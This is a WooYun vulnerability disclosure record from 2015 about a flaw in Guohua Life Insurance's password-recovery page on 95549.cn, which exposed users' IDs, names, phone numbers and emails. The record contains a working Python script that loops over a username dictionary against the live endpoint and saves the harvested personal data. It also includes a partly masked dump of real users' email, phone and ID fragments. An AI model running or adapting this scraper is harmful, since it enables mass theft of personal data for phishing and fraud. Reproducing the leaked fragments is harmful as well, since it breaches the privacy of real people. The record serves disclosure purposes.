{"id": 17078, "wybug_id": "wooyun-2015-0126008", "wybug_title": "国华人寿某处设计不当可查询任意用户信息（附脚本）", "wybug_corp": "95549.cn", "wybug_author": "wps2015", "wybug_date": "2015-07-11 08:55", "wybug_open_date": "2015-07-16 08:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 设计不当，可查询任意用户信息 详细说明：  问题出在国华人寿找回密码处：http://eservice.95549.cn/eservice/login.action?action=initGetPwd这里以用户名admin为例\n\n点击下一步，进入邮件或者手机找回，但是通过查看源代码发现，用户的用户名，邮箱，id，电话信息出现在隐藏表单里面\n\n为了证明漏洞危害性，我写了个程序跑了个用户名字典，并抓取源代码里返回的信息\n\nmask 区域\n*****,13888888888 **********69696969 **********2341234 ,ce**********52 ,guzy@guo**********1 , ,a**********2632563 ,te**********,cacacacaca@**********0003 ,123**********930123964 **********552 ,46207**********397082847**********842 ,xialihu**********9126 ,alina**********3 ,allan_kis**********922 ,alvin.********** ,wenbin.hu@**********88434 ,174**********125057 ,361**********4672 ,128057**********659 ,threeda**********22 ,betty@br**********406 ,fairpa**********98090 ,710**********3579646 ,21**********1639 ,87998**********625415 ,706**********15021 ,casp**********50343 ,lji**********511 ,87708**********8769 ,chen**********86968 ,315zh**********5409136 ,80**********93378 ,yujun**********38096 ,chl**********862183 ,bb**********2050 ,zhaojie**********38953 ,363**********796 ,bestshua**********72677 ,edco**********06896 ,consta**********5409136 ,80**********8473252 ,7**********2308122 ,34**********266 ,daisy_**********340 ,qiuqiu**********503241 ,102**********813 ,jane918**********126749 ,ta**********1709 ,earvin**********01 ,zhengzhan**********042858 ,144**********134 ,tulong**********101694 ,yu**********0576 ,6167**********3248 ,64973**********2862 ,gerald**********416763 ,fx5**********103322 ,201**********758857 ,harr**********9840 ,dongme**********12 ,he_minge**********3397 ,13370**********5582 ,64402**********hu.zhehao@ebiz-**********333 ,hyman0**********087254 ,1428**********16434 ,598**********30001 ,7530**********0441 ,41212**********8805 ,wenfe**********,yousheng001@**********92 ,dingdang1**********52842 ,ouj**********5928101 ,790**********0019 ,90708**********13802 ,jerem**********3629 ,78728**********0380407 ,54**********913458 ,le**********2312121 ,**********28656 ,magicw**********0230038 ,m**********838383 ,jl**********32154 ,laiba**********0215 ,g1713**********00 ,leijh@gu**********3008 ,ck861**********822715 ,644**********8822 ,94203**********59647529**********55 ,leolian**********03631 ,641**********17122 ,sunr**********005 ,jieden**********30795 ,853**********136 ,lu_ng**********358579 ,271**********0 ,zhou_7810**********87 ,maggiewa**********6605 ,58518**********taozhile**********91992 ,zongx**********6020285 ,w**********88 ,may1630**********78463 ,micha**********838588 ,371**********534 ,prm_6**********innie**********04025 ,7854**********3395 ,weij**********0399 ,nathan**********588550 ,cgw**********6081 ,peter**********83537 ,11209**********448925 ,qin**********918880 ,don**********26703 ,ren**********11774 ,872**********250529 ,257**********2134 ,50592**********2302 ,4707**********2681977 ,30**********3981 ,61034**********2266 ,samson**********451124 ,155**********merflower0120**********041 ,panasia**********7775 ,138158**********15942 ,1614**********656327 ,774**********91928 ,zxy5**********64340 ,abiga**********0957392 ,91**********6211 ,wuhl@**********70 ,shinaonl**********377 ,shirley_**********9955 ,simon**********wu@guohua**********06 ,meijun2**********7554 ,sonja**********6156926 ,d**********51125 ,hllzq**********691 ,stephenx**********cod*****\n\n泄露用户信息，易导致钓鱼诈骗等风险   漏洞证明：  附python脚本\n#! usr/bin/env python# -*- coding: utf-8 -*-import reimport urllib2import urllibHTTPHEADER = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\\              'Accept-Charset':'GBK,utf-8;q=0.7,*;q=0.3',\\              'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US;rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',\\              'Content-Type':'application/x-www-form-urlencoded'}def getPage(_url,data):    req = urllib2.Request(_url,headers = HTTPHEADER)    data=urllib.urlencode(data)    response = urllib2.urlopen(req,data)    page=response.read()    return pagedef get_info(page):\tregex=r'id=\"name\" value=\"(?P<name>.*?)\"/>[\\s\\S]*?id=\"cid\" value=\"(?P<cid>.*?)\"/>[\\s\\S]*?id=\"mobile\" value=\"(?P<mobile>[\\s\\S]*?)\"/>[\\s\\S]*?id=\"email\" value=\"(?P<email>.*?)\"/>'\tpatt = re.compile(regex)\tresult=patt.search(page)\tif result:\t\tname=result.group('name')\t\tcid=result.group('cid')\t\tmobile=result.group('mobile')\t\temail=result.group('email')\t\tprint name\t\tf=open('info.txt','a')\t\tf.write(cid+' ,'+name+' ,'+mobile+' ,'+email+'\\n')\telse:\t\tpassif __name__ == '__main__':\t_url='http://trade.95549.cn/eservice/login.action?action=getPwd'\tfile_1=open('username.txt','r')\tfor  i in file_1.readlines():\t\ti=i.replace('\\n','')\t\tdata = {'redirectURL':'', 'name':''+i+''}  \t\t#print data \t\tpage=getPage(_url,data)\t\tget_info(page)\n   修复方案：  怎么能返回信息呢？   版权声明：转载请注明来源 wps2015@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-16 08:56 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-16 09:51 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  应该不止这么玩吧    \n     2015-07-16 10:02 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  怎么会忽略了    \n     2015-07-16 10:03 |    \t\twps2015 \t\t\t( 普通白帽子  |\t\t\t        Rank:426 漏洞数:60        | 不叫一日荒废)\t\t \n  这个厂商的全忽略了。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}